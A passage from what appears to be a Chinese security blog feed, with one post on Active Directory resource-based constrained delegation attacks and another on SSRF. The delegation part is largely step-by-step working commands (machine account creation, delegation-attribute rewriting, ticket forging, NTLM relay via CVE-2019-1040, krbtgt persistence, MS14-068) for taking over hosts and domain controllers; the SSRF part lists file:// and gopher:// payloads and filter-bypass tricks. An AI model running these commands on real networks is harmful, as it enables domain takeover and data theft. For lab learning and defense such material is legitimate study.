<h6 id="差别"><a href="#差别" class="headerlink" title="差别"></a>差别</h6><p>传统的委派是想办法让域控请求A这样A就可以利用域控的身份去请求B的服务</p>
<p>基于资源的约束委派则是相反的，它是改变A的SID，达到让A模拟用户访问B资源的目的</p>
<p>msDS-AllowedToActOnBehalfOfOtherIdentity属性指向委派账户</p>
<h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ol>
<li><p>具有对主机修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限</p>
<p>(如已经控制的主机是WEB 则具有修改WEB主机的msDS-AllowedToActOnBehalfOfOtherIdentity的权限账户)</p>
</li>
<li><p>可以创建机器账户的域用户（或已知机器账户）</p>
</li>
</ol>
<p>服务账户可以将机器账户加入域，最多10个</p>
<p>能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的只有将主机加入域的用户和主机的机器账户</p>
<h6 id="怎么查看是谁把你加入域的"><a href="#怎么查看是谁把你加入域的" class="headerlink" title="怎么查看是谁把你加入域的"></a>怎么查看是谁把你加入域的</h6><p>账户中有个msDS-CreatorSID属性，用于标记加入域时使用的用户的SID值，这样就可以知道是谁把你加入域的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 192.168.30.20 -b &quot;DC=hack-my,DC=com&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br></pre></td></tr></table></figure></div>



<h6 id="Account-Operators组内用户"><a href="#Account-Operators组内用户" class="headerlink" title="Account Operators组内用户"></a>Account Operators组内用户</h6><p>Account Operators组内用户可以修改域内任意主机（除了域控）的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p>
<p>所以我们拿到了这个权限就可以拿到除域控外所有机器的system权限</p>
<h6 id="利用1-1"><a href="#利用1-1" class="headerlink" title="利用1"></a>利用1</h6><p>攻击思路：</p>
<p>前提是获取Alice权限</p>
<p>利用一个服务账户Alice创建一个机器账户</p>
<p>然后修改WIN2008-WEB的msDS-AllowedToActOnBehalfOfOtherIdentity 为新创建的机器用户的sid</p>
<p>然后利用机器账户申请票据 进行提权</p>
<h6 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h6><p>先利用Powermad.ps1创建一个机器账号</p>
<p>名字test1，密码123456</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test1 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407170719758.png"
                      alt="image-20230407170719758"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407171019208.png"
                      alt="image-20230407171019208"
                ></p>
<p>利用powerView查询机器账户的SID</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import-module .\PowerView.ps1</span><br><span class="line">Get-NetComputer test1 -Properties objectsid</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407220117870.png"
                      alt="image-20230407220117870"
                ></p>
<p>test1 sid：S-1-5-21-1400638014-602433399-2258725660-1148</p>
<p>设置委派</p>
<p>修改WEB的msds-allowedtoactonbehalfofotheridentity的值，把他的sid改为test1的sid</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用powerView</span><br><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1400638014-602433399-2258725660-1148)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WEB| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure></div>

<p>查询是否修改成功</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainComputer WEB -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407220808294.png"
                      alt="image-20230407220808294"
                ></p>
<p>清除 msds-allowedtoactonbehalfofotheridentity 属性的值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-DomainObject WEB -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure></div>

<p>再生成票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.30.20 hack-my.com/test1\$:123456 -spn cifs/WEB.hack-my.com -impersonate administrator</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230407221007040.png"
                      alt="image-20230407221007040"
                ></p>
<p>最后导入票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py WEB.haishi.com -no-pass -k -dc-ip 192.168.30.20</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408124248309.png"
                      alt="image-20230408124248309"
                ></p>
<p>这里还是需要将域名加入到hosts</p>
<p>利用psexec上去的权限更高</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 psexec.py -k haishi.com/administrator@WEB.haishi.com -no-pass</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408124555238.png"
                      alt="image-20230408124555238"
                ></p>
<h6 id="利用2-2"><a href="#利用2-2" class="headerlink" title="利用2"></a>利用2</h6><p>刚才讲过Acount Operators组用户可以获得除域控外所有主机的权限</p>
<p>是因为Acount Operators组成员可以修改域内除了域控其他所有主机的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p>
<p>在本地先设置一个Acount Operators组成员，设置Alice为这个</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408151945659.png"
                      alt="image-20230408151945659"
                ></p>
<p>可以利用Adfind查询Acount Operators组成员</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 192.168.30.10:389 -s subtree -b CN=&quot;Account Operators&quot;,CN=Builtin,DC=hack-my,DC=com member</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408152951481.png"
                      alt="image-20230408152951481"
                ></p>
<p>然后创建一个机器账户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test3 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408153516233.png"
                      alt="image-20230408153516233"
                ></p>
<p>设置委派</p>
<p>查询test3的sid</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line">Get-NetComputer test3 -Properties objectsid</span><br></pre></td></tr></table></figure></div>

<p>test3 sid:S-1-5-21-1400638014-602433399-2258725660-1152</p>
<p>修改WEB的msds-allowedtoactonbehalfofotheridentity的值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1400638014-602433399-2258725660-1152)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WEB| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure></div>

<p>生成票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.30.10 hack-my.com/test3\$:123456 -spn cifs/WEB.hack-my.com -impersonate administrator</span><br></pre></td></tr></table></figure></div>

<p>将生成的票据导入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py WEB.hack-my.com -no-pass -k -dc-ip 192.168.30.10</span><br></pre></td></tr></table></figure></div>

<p>然后就获得主机的控制权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408154535638.png"
                      alt="image-20230408154535638"
                ></p>
<h6 id="利用3-1"><a href="#利用3-1" class="headerlink" title="利用3"></a>利用3</h6><p>结合HTLM Relay接管域控（CVE-2019-1040）</p>
<p>需要用到辅助域控win2016</p>
<p>DC2 10.150.127.186</p>
<p>首先就是创建一个机器用户test2 123456</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test2 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408155940211.png"
                      alt="image-20230408155940211"
                ></p>
<p>然后开启监听</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldap://10.150.127.166 -smb2support --remove-mic --delegate-access --escalate-user test2\$</span><br></pre></td></tr></table></figure></div>

<p>然后利用打印机漏洞</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py haishi.com/many:asd123\!\@10.150.127.186 10.150.127.128</span><br></pre></td></tr></table></figure></div>

<p>然后申请票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py haishi.com/test2\$:123456 -spn CIFS/DC2.haishi.com -impersonate Administrator -dc-ip 10.150.127.166</span><br></pre></td></tr></table></figure></div>

<p>导入票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py WEB.hack-my.com -no-pass -k -dc-ip 10.150.127.186</span><br></pre></td></tr></table></figure></div>

<p>成功</p>
<p>ntlm-relay攻击的前提是，smb认证获取的机器没有开启smb签名</p>
<p>cve-2019-1040作用是绕过mic检验，因为打印机触发的是smb协议，域控是默认带有smb签名的，而这个漏洞在这里就刚好绕过了mic检验，就完成了 ntlm-relay攻击</p>
<h6 id="利用4-1"><a href="#利用4-1" class="headerlink" title="利用4"></a>利用4</h6><p>黄金票据变种</p>
<p>主要原理就是在获得域控权限后，对krbtgt用设置委派属性，来打造黄金票据，进行权限维持</p>
<p>步骤</p>
<p>创建一个机器账户 test4 123456</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408161503905.png"
                      alt="image-20230408161503905"
                ></p>
<p>具体的不说了</p>
<p>然后来到域控上</p>
<p>powershell，去配置基于资源的约束委派</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount test4$</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408161546381.png"
                      alt="image-20230408161546381"
                ></p>
<p>成功</p>
<p>现在来说krbtgt的密码hash怎么变都不会影响黄金票据的打造</p>
<p>申请票据（kali）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py haishi.com/test4\$:123456 -spn krbtgt -impersonate administrator -dc-ip 10.150.127.166</span><br></pre></td></tr></table></figure></div>

<p>导入票据</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">python3 smbexec.py -k administrator@DC.haishi.com -no-pass -dc-ip 10.150.127.166</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230408161735293.png"
                      alt="image-20230408161735293"
                ></p>
<p>完美</p>
<p>总结：委派可以比喻为你叫别人拿快递，你得把自己的取件码（票据）发给他才能找到你得快递</p>
<p>但是如果你买的东西涉及个人隐私，别人拿到你的取件码（票据）就会导致隐私泄露的问题，不过一般涉及隐私的也不会找别人拿，所以得使点手段了</p>
<p>这就像域控被委派导致其他主机账户具有域控的权限，就可以为所欲为</p>
<p>被委派的对象会将自己的票据发给委派主机，这是委派的机制，是不会变的</p>
<p>所以攻击思路就是想办法拿到域控的“取件码”，可以认为是强迫域控让你帮他拿快递，这样你就拿到域控的取件码（票据）就可以干域控可以干的事了</p>
<h3 id="PAC攻击"><a href="#PAC攻击" class="headerlink" title="PAC攻击"></a>PAC攻击</h3><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>这个漏洞的原因是KDC无法正确检查PAC中的有效签名，因为实现签名的加密允许所有的签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证，所以不需要相关的密钥算法，比如md5</p>
<p>这就导致了用户可以自己构造一张PAC，伪造用户的SID和所在的组</p>
<p>这个伪造的PAC，加入域管相关信息，访问域控服务，KDC就会认为该用户有权限，就把他当作域管理组的成员，这就为提升到域管理员提供了条件</p>
<h6 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h6><p>通过WIN2008上利用kekeo执行这个命令，就可以成功的访问域控的CIFS服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;exploit::ms14068 /domain:hack-my.com /user:username /password:password /ptt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

]]></content>
  </entry>
  <entry>
    <title>SSRF漏洞</title>
    <url>/2023/04/14/SSRF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>ssrf是指攻击者向服务器发送包含恶意URL链接的请求，借这个服务器去访问URL。</p>
<p>通常是被用于探测攻击者无法访问到的网络区域，比如服务器所在的内网，或者是受防火墙访问限制的主机</p>
<p>ssrf漏洞的产生是由于服务端的web应用需要从其他的服务器上拉取数据，如图片、视频、文件的上传下载等，但是关键的就是，由于疏忽或者其他原因，这个请求地址可以被外部用户控制，这就导致了漏洞的产生。</p>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>内网探测：对内网服务器、办公机进行端口扫描、资产扫描、漏洞扫描</p>
<p>窃取本地或者内网敏感数据：访问或下载内网的敏感数据，利用file服务访问服务器本地的文件</p>
<p>攻击服务器本地或内网应用：利用发现的漏洞进一步发起攻击利用</p>
<p>跳板攻击：借助ssrf的漏洞利用这台服务器对内或者对外发起攻击，这样就可以隐藏自己的IP地址</p>
<p>绕过安全防御：可以绕过如防火墙或者waf等安全设备的防御，因为这些安全设备一般不对服务器进行流量监控</p>
<p>拒绝服务攻击：使服务器请求超大的文件，保持连接keep-alive always</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>PHP中的代码函数使用不当就会造成SSRF攻击</p>
<h6 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h6><p>这个协议作用是把整文件读入一个字符串中</p>
<p>语法：file_get_contents(path,include_path,context,start,mac_length)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/cbfc0a66466b42279035c4f0973adb7f.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413180255276.png"
                      alt="image-20230413180255276"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413180327206.png"
                      alt="image-20230413180327206"
                ></p>
<p>访问这个文件即可</p>
<h6 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h6><p>开启这个函数需要php.ini中的allow_url_fopen&#x3D;On</p>
<p>用于打开网络的Socket连接</p>
<p>语法：fsockopen($host, $port, $errno, $errstr, $timeout)</p>
<p>在使用这个函数之后会放回文件指针，供文件函数使用，包括fgets()、fgetss()、fputs()、fclose()与feof()参数errno和errstr也是可以省略的，主要当做错误出处理使用</p>
<h6 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h6><p>它会执行一个cURL会话</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413220824075.png"
                      alt="image-20230413220824075"
                ></p>
<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><h6 id="http-x2F-s"><a href="#http-x2F-s" class="headerlink" title="http&#x2F;s"></a>http&#x2F;s</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413221435446.png"
                      alt="image-20230413221435446"
                ></p>
<p>设置URL和相应的选项</p>
<p>curl_setopt($ch,CURLOPRT_URL,”Al.png”);&#x2F;&#x2F;抓取网页内容</p>
<p>curl_setopt($ch,CURLOPT_HEADER,0);&#x2F;&#x2F;不返回头部字段</p>
<h6 id="file-x2F-x2F-：从文件系统中获取文件内容，如，file-x2F-x2F-x2F-etc-x2F-passwd"><a href="#file-x2F-x2F-：从文件系统中获取文件内容，如，file-x2F-x2F-x2F-etc-x2F-passwd" class="headerlink" title="file:&#x2F;&#x2F;：从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd"></a>file:&#x2F;&#x2F;：从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</h6><p>用于访问虚拟机的本地文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413222327093.png"
                      alt="image-20230413222327093"
                ></p>
<h6 id="dict-x2F-x2F-：字典服务器协议，访问字典资源，如，dict-x2F-x2F-ip-6739-x2F-info"><a href="#dict-x2F-x2F-：字典服务器协议，访问字典资源，如，dict-x2F-x2F-ip-6739-x2F-info" class="headerlink" title="dict:&#x2F;&#x2F;：字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;ip:6739&#x2F;info"></a>dict:&#x2F;&#x2F;：字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;ip:6739&#x2F;info</h6><p>用来探测内网主机的存活与端口开放情况</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413222623061.png"
                      alt="image-20230413222623061"
                ></p>
<p>上图说明开放3306端口，说明具有mysql数据库</p>
<h6 id="ftp协议：文件传输"><a href="#ftp协议：文件传输" class="headerlink" title="ftp协议：文件传输"></a>ftp协议：文件传输</h6><p>这里没有输入用户和密码，所以他不现实ftp连接地址下的文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413230316765.png"
                      alt="image-20230413230316765"
                ></p>
<p>要复现这个漏洞就需要搭建ftp服务器</p>
<h6 id="gopher-x2F-x2F-：分布式文档传递服务，可使用gopherus生成payload。"><a href="#gopher-x2F-x2F-：分布式文档传递服务，可使用gopherus生成payload。" class="headerlink" title="gopher:&#x2F;&#x2F;：分布式文档传递服务，可使用gopherus生成payload。"></a>gopher:&#x2F;&#x2F;：分布式文档传递服务，可使用gopherus生成payload。</h6><p>这是Internet上面一个非常有名的信息查找系统，它将Internet上面的文件组织成某种索引，很方便地将用户从Internet一处带到另一处，使用tcp70</p>
<p>但是在www出现之后人们使用它的频率就很少了</p>
<p>但是他是SSRF漏洞中最强大的协议</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230413231323667.png"
                      alt="image-20230413231323667"
                ></p>
<p>-wite-curlwrappers：使用curl根据打开url数据流</p>
<p>协议格式</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure></div>

<p>使用gopher协议时，回车换行输入%0d%0a，空格输入%20，问号输入%3f，结束符%0d%0a</p>
<p>SSRF漏洞在真实环境中常常去攻击redis、FastCGI等服务</p>
<h4 id="挖掘SSRF漏洞"><a href="#挖掘SSRF漏洞" class="headerlink" title="挖掘SSRF漏洞"></a>挖掘SSRF漏洞</h4><p>只要能对外发起网络请求的地方，就可能存在SSRF漏洞</p>
<p>从远程服务器请求资源（Upload from URL,Import &amp;Export RSS feed)<br>数据库内置功能(Oracle[UTL_HTTP]、MongoDB、MSSQL、Postgres、CouchDB)<br>Webmail 收取其它邮箱邮件（POP3&#x2F;IMAP&#x2F;SMTP)<br>文件处理，编码处理，属性信息处理（ffpmg,ImageMaic，DOCX，PDF，XML处理器）</p>
<h6 id="利用条件：被攻击的服务等没有开启加密传输与鉴权"><a href="#利用条件：被攻击的服务等没有开启加密传输与鉴权" class="headerlink" title="利用条件：被攻击的服务等没有开启加密传输与鉴权"></a>利用条件：被攻击的服务等没有开启加密传输与鉴权</h6><h4 id="redis未授权漏洞的6种利用方法"><a href="#redis未授权漏洞的6种利用方法" class="headerlink" title="redis未授权漏洞的6种利用方法"></a>redis未授权漏洞的6种利用方法</h4><p>可以将恶意文件保存在www目录中</p>
<p>可以创建authorized_keys文件，利用ssh私钥登录服务器</p>
<p>写计划任务(&#x2F;var&#x2F;spool&#x2F;cron&#x2F; &amp; &#x2F;etc&#x2F;cron.d&#x2F;)</p>
<p>slave of 8.8.8.8 主从模式利用</p>
<p>写入到&#x2F;etc&#x2F;profile.d&#x2F; 用户环境变量修改</p>
<p>开启AOF持久化纯文本记录 appendfilename</p>
<h4 id="攻击利用举例"><a href="#攻击利用举例" class="headerlink" title="攻击利用举例"></a>攻击利用举例</h4><p>靶场：pikachu</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412205041999.png"
                      alt="image-20230412205041999"
                ></p>
<p>注意看这有个url说明它有去调用网站中的服务器文件</p>
<p>如果没过滤好的话就会造成SSRF的漏洞</p>
<p>我们就可以试一下修改为这个</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure></div>

<p>意思是利用file:&#x2F;&#x2F;伪协议读取系统中的文件，敏感文件win.ini</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412205836754.png"
                     
                ></p>
<p>这样就可以读取到文件里面的内容</p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>一般的代码开发人员不会傻到一点防护都没有，肯定会做一些过滤操作的，这就涉及到绕过</p>
<h6 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h6><p><code>http://www.baidu.com@10.10.10.10</code> 与 <code>http://10.10.10.10</code> 请求是相同的</p>
<p>原理涉及到解析url的规则问题，一般利用url解析导致的SSRF过滤被绕过的基本上都是因为后端通过布阵却的正则表达式对url进行了解析</p>
<p>但是在2017年的黑客大会上介绍了一种全新的方式，就是利用不同编程语言之间对url处理标准来绕过ssrf过滤，从而实施攻击</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412212649561.png"
                      alt="image-20230412212649561"
                ></p>
<p>上面这个图表示了，NodeJS url、Perl URI、Go net&#x2F;url、PHP parser_url 以及 Ruby addressable 这些编程语言是解析为google.com</p>
<p>但是cURL libcurl却解析为evil.com:80</p>
<h6 id="点分割符号替换"><a href="#点分割符号替换" class="headerlink" title="点分割符号替换"></a>点分割符号替换</h6><p>在浏览器中可以使用不同的分割符号来代替域名中的   .    号，如<code>。 &lt;-有个空格</code> 、 <code>。</code>、 <code>. &lt;-有个空格</code> 来代替</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412213447530.png"
                      alt="image-20230412213447530"
                ></p>
<h6 id="本地回环地址"><a href="#本地回环地址" class="headerlink" title="本地回环地址"></a>本地回环地址</h6><p>127.0.0.1，通常被称为回环地址，指的是本机的虚拟接口，表示方法如下</p>
<p>（ipv6的地址使用http访问需要加[]这个符号）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412213650506.png"
                      alt="image-20230412213650506"
                ></p>
<h6 id="IP地址进制转换"><a href="#IP地址进制转换" class="headerlink" title="IP地址进制转换"></a>IP地址进制转换</h6><p>通常IP地址都是被分割成4个8位的二进制数，一般用点分十进制表示如192.168.3.1，所以IP地址可以用不同的进制表示</p>
<p>IPFuscator工具可以实现IP地址的进制转换</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 IPFuscator.py </span><br></pre></td></tr></table></figure></div>

<p>在脚本对IP地址进行八进制转换的时候，一般会在末尾多一个L</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412214129659.png"
                      alt="image-20230412214129659"
                ></p>
<h6 id="封闭式字母数字"><a href="#封闭式字母数字" class="headerlink" title="封闭式字母数字"></a>封闭式字母数字</h6><p>封闭式字母数字是一个由字母数字组成的 Unicode 印刷符号块，使用这些符号块替换域名中的字母也可以被浏览器接受。在浏览器测试中只有下列单圆圈的字符可用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412215200838.png"
                      alt="image-20230412215200838"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230412215207003.png"
                      alt="image-20230412215207003"
                ></p>
